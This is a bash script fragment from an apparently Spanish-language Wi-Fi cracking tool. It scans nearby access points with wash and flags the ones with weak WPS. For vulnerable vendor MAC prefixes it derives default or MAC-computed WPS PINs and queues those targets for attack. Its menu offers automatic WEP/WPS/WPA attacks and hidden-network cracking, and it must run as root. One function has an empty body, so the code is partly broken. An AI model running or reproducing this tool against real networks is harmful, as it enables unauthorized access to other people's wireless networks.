
function ataqueWash(){
	Ver_Pckg_Tools
                Ver_Mon_WCar_Fun
                if [ "$VerMon" != "" ]
                then
                    Ver_Mon_Fun
                    trap kill_wash SIGINT
                    wash -i $mon -C -o ${Temporary}/wash.txt > /dev/null &
                    WashID="$!"
                    disown $WashID
                    for ((c=0; c<=3; c++))
                    do
                        echo -ne "\r[00:${Green}0${c}$White]$White Click$Green CTRL+C$White when ready,good luck"
                        sleep 1
                    done
                    back=0
                    fin=0
                    num_wireless=-1
                    ti=0
                    while [ "$back" == "0" ]
                    do
                        echo -ne '\033c'
                        echo -e "${White} +${Red}---------------------------------------------------------------------------------${White}+"
                        echo -e "${Red} |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BGreen green$White this mean that device is vulnerable.${Red}                  |"
                        echo -e " |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BYellow yellow$White this mean that device is may be vulnerable or aren't.${Red}|"
                        echo -e " |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BRed red$White this mean the wps of that device is Locked.$Red             |"
                        echo -e " |${Red} [${Yellow}+${Red}]${White} If the BSSID in$Purple Purple$White this mean that device is has a default pin or aren't.${Red}|"
                        echo -e "${White} +${Red}---------------------------------------------------------------------------------${White}+"
                        echo -e ${Yellow}"  ID	${BWhite}BSSID                  CH       PWR     WPS Locked   Ver    ESSID"
                        echo -e $Purple" ~~~~   ~~~~~                  ~~       ~~~     ~~~~~~~~~~   ~~~    ~~~~~"
                        i=0
                        Quit=0
                        NL=1
                        count_rot=0
                        while [ $Quit == 0 ]
                        do
                            cat ${Temporary}/wash.txt | sed '1,2d' > ${Temporary}/wash_nf.txt
                            line=`cat ${Temporary}/wash_nf.txt | sed -n ${NL}p 2> /dev/null`
                            if [ "$line" != "" ]
                            then
                                v=0
                                MAC=`echo $line | awk -F' ' '{print $1}'`
                                CHANNEL=`echo $line | awk -F' ' '{print $2}'`
                                POWER=`echo $line | awk -F' ' '{print $3}'`
                                WPS_VERSION=`echo $line | awk -F' ' '{print $4}'`
                                WPS_LOCKED=`echo $line | awk -F' ' '{print $5}'`
                                ESSID=`echo $line | cut -d' ' -f6-`
                                length=${#MAC}
                                if [ $length -ge 17 ]; then
                                    i=$(($i+1))
                                    if [ $i != 0 ]; then
                                        d=1
                                    else
                                        d=0
                                    fi
                                    POWER=`expr $POWER + 100`
                                    Ver_vun=`echo $MAC | cut -c 1-8`
                                    if [ "$WPS_LOCKED" == "No" ]
                                    then
                                        WPS_LOCKED="  No  "
                                    else
                                        WPS_LOCKED="Locked"
                                    fi
                                    if [ "$i" -lt "10" ]
                                    then
                                        echo -e -n " ${Red}[${Yellow}0"$i"${Red}]\t"
                                    else
                                        echo -e -n " ${Red}[${Yellow}"$i"${Red}]\t"
                                    fi
                                    CP=$(echo -e "$Vun_MAC_LIST" | grep -w "$Ver_vun")
                                    if [ "$CP" != "" ]
                                    then
                                        v=1
                                    fi
                                    Num_OF_PIN[$i]=0
                                    Num_OF_MAC[$i]=0
                                    CP=""
                                    CP=$(echo -e "$Default_PIN_MAC_LIST" | grep "$Ver_vun" | awk -F"=" '{print $1}')
                                    CP1=$(echo -e "$GENERATED_PIN_MAC_LIST" | grep "$Ver_vun")
                                    if [ "$CP" != "" ]
                                    then
                                        Num_OF_PIN[$i]=`echo $(($(($(echo ${Default_PIN_MAC[$CP]} | tr " " "\n" | wc -l)-$(echo ${Default_PIN_MAC[$CP]} | tr " " "\n" | sed -n 1p)))-1))`
                                        Num_OF_MAC[$i]=`echo ${Default_PIN_MAC[$CP]} | tr " " "\n" | sed -n 1p`
                                        if [ "${Num_OF_PIN[$i]}" -ge "2" ]
                                        then
                                            for (( p=1; p<=${Num_OF_PIN[$i]}; p++))
                                            do
                                                declare PIN$(echo $MAC | tr -d ":")[$((p-1))]=$(echo ${Default_PIN_MAC[$CP]} | tr " " "\n" | sed -n $(($(($p+1))+${Num_OF_MAC[$i]}))'p')
                                            done
                                        else
                                            declare PIN$(echo $MAC | tr -d ":")[1]=$(echo ${Default_PIN_MAC[$CP]} | tr " " "\n" | sed -n $(($(echo ${Default_PIN_MAC[$CP]} | tr " " "\n" | sed -n 1p)+2))'p')
                                        fi
                                        HHDP_GEN[$i]=0
                                        HHDP[$i]=1
                                    elif [ "$CP1" != "" ]
                                    then
                                        Num_OF_PIN[$i]="1"
                                        LAST_SIX_DIGITS=$(echo $MAC | awk -F":" '{print $4,$5,$6}' | tr -d " ")
                                        HEX_TO_DEC=$(printf '%d\n' 0x${LAST_SIX_DIGITS}) 2> /dev/null
                                        HALF_MAC=`expr '(' $HEX_TO_DEC '%' 10000000 ')'`
                                        PIN=`expr 10 '*' $HALF_MAC`
                                        ACCUM=0
                                        ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`
                                        ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`
                                        ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`
                                        ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
                                        ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
                                        ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
                                        ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`
                                        THE_REST=`expr $ACCUM '%' 10`
                                        CHECK_THE_REST=`expr '(' 10 '-' $THE_REST ')' '%' 10`
                                        PIN[$i]=$(printf '%08d\n' `expr $PIN '+' $CHECK_THE_REST`)
                                        HHDP_GEN[$i]=1
                                        HHDP[$i]=1
                                    else
                                        HHDP[$i]=0
                                    fi
                                    BLUE_MAC=0
                                    if [ $(cat ${Desktop_PATH}/Passwords\ \&\ Pins/${MAC}* 2> /dev/null | grep -i 'pin' | wc -l 2> /dev/null) -gt 0 ] || [ "$(cat ${Desktop_PATH}/Passwords\ \&\ Pins/${MAC}* 2> /dev/null | grep -i 'Key' | cut -d'"' -f2 2> /dev/null)" != "" ]
                                    then
                                        echo -e -n $BBlue"$MAC      "
                                        BLUE_MAC=1
                                    elif [ "$WPS_LOCKED" == "Locked" ]
                                    then
                                        echo -e -n $BRed"$MAC      "
                                    elif [ "$v" == 1 ]
                                    then
                                        echo -e -n $BGreen"$MAC      "
                                    elif [ "${HHDP[$i]}" == "1" ]
                                    then
                                        echo -e -n $Purple"$MAC      "
                                    else
                                        echo -e -n $BYellow"$MAC      "
                                    fi
                                    if [ "$v" == 1 ] && [ "$(echo $ESSID)" != "" ] && [ "$BLUE_MAC" -eq 0 ] || [ "${HHDP[$i]}" == 1 ] && [ "$(echo $ESSID)" != "" ] && [ "$BLUE_MAC" -eq 0 ]
                                    then
                                        ti=$(($ti+1))
                                        Vun_BSSID[$ti]=$MAC
                                        Vun_CHANNEL[$ti]=$CHANNEL
                                        Vun_ESSID[$ti]=$ESSID
                                        Vun_PRIVACY[$ti]=$PRIVACY
                                        Vun_SPEED[$ti]=$SPEED
                                        Vun_Num_OF_PIN[$ti]=${Num_OF_PIN[$i]}
                                        Vun_PIN[$ti]=${PIN[$i]}
                                        Vun_HHDP[$ti]=${HHDP[$i]}
                                        Vun_HHDP_GEN[$ti]=${HHDP_GEN[$i]}
                                    fi
                                    if [ "$CHANNEL" -ge 10 ]
                                    then
                                        echo -e -n $BWhite"$CHANNEL\t"
                                    else
                                        echo -e -n $BWhite"0$CHANNEL\t"
                                    fi
                                    if [ $POWER -ge 40 ]
                                    then
                                        echo -e -n $Green"$POWER%\t"
                                    elif [ $POWER -ge 30 ]
                                    then
                                        echo -e -n $Yellow"$POWER%\t"
                                    else
                                        echo -e -n $Red"$POWER%\t"
                                    fi
                                    if [ "$WPS_LOCKED" == "  No  " ]
                                    then
                                        echo -e -n $Green"  $WPS_LOCKED"
                                    else
                                        echo -e -n $Red"  $WPS_LOCKED"
                                    fi
                                    echo -e -n $Green"     $WPS_VERSION"
                                    echo -e $BWhite"    $ESSID\t"
                                    IDLENGTH=$IDLENGTH
                                    ESSID[$i]=$ESSID
                                    CHANNEL[$i]=$CHANNEL
                                    BSSID[$i]=$MAC
                                    SPEED[$i]=$SPEED
                                fi
                                NL=$(($NL+1))
                            fi
                            sleep 0.1
                            if [ "$fin" -eq 1 ]
                            then
                                count_rot=$(($count_rot+1))
                            fi
                            if [ "$count_rot" -eq "$num_wireless" ]
                            then
                                Quit=1
                            fi
                        done < <( cat ${Temporary}/wash_nf.txt 2> /dev/null )
                        num_wireless=$i
                        fin=1
                        trap exit_function SIGINT
                        echo ""
                        echo ""
                        SELECT_TO_CRACK
                    done
                    if [ "$back" == "1" ]
                    then
                        re="yes"
                    elif [ "$back" == "2" ]
                    then
                        re="no"
                    fi
                fi
}

function mostrarMarcaDeAgua(){

}

function mostrarMenu(){
	echo -e "$Yellow     +${White}-------------------------------------------------------------------${Yellow}+"
    echo -e "${White}     | ${Yellow} ID ${White} |                   ${BPurple}   Name                             ${White}     |"
    echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
	echo -e "${White}     | ${Red}[${Yellow}01${Red}]${White} |$Green Ataque automatico con ${Cyan} Wash${White} .        (${Red}WPS${Green}{${Yellow}WPA${White}/${Yellow}WPA2${Green}}${White})    |"
    echo -e "${White}     | ${Red}[${Yellow}02${Red}]${White} |$Green Ataque automatico con ${Cyan} Airodump-ng${White} . (${Red}WEP${White}/${Red}WPS${Green}{${Yellow}WPA${White}/${Yellow}WPA2${Green}}${White})|"
    echo -e "${White}     | ${Red}[${Yellow}03${Red}]${White} |$Green Entrada Manual${White} .                                             |"
    echo -e "${White}     | ${Red}[${Yellow}04${Red}]${White} |$Green Si quieres atacar un access point con $BRed WPS PIN${White} .   |"
    echo -e "${White}     | ${Red}[${Yellow}05${Red}]${White} |$Green Si quieres crackear un $Green acces point $BRed Oculto ${White} .                |"
    echo -e "${White}     | ${Red}[${Yellow}06${Red}]${White} |$Green ${Green}Activar${White} o ${Red}Desactiviar${White} El${Cyan} Modo Monitor${White} .                       |"
    echo -e "${White}     | ${Red}[${Yellow}07${Red}]${White} |$Green Salir${White} .${White}                                                     |"
    echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
    echo ""
    echo -e -n "$White    ${Red} [${Cyan}!${Red}]$White Escribe $BRed el ID $White de tu eleccion :"
}

function rootNecesario(){
	echo -e "$Yellow     +${White}-------------------------------------------------------------------${Yellow}+"
    echo -e "${White}     | [${Red}!${White}] Necesitas iniciar como root para utilizar el programa  ${White}|"
    echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
    echo -e "${White}     | ${Red}                 \$${White}=> sudo ${Yellow}./${Green}HT${White}-${Green}WB${White}.${Green}sh${White}                              |"
    echo -e "${White}     | ${Red}                 \$${White}=> sudo ${Blue}bash ${Green}HT${White}-${Green}WB${White}.${Green}sh${White}                           |"
    echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
    echo ""
    echo ""
}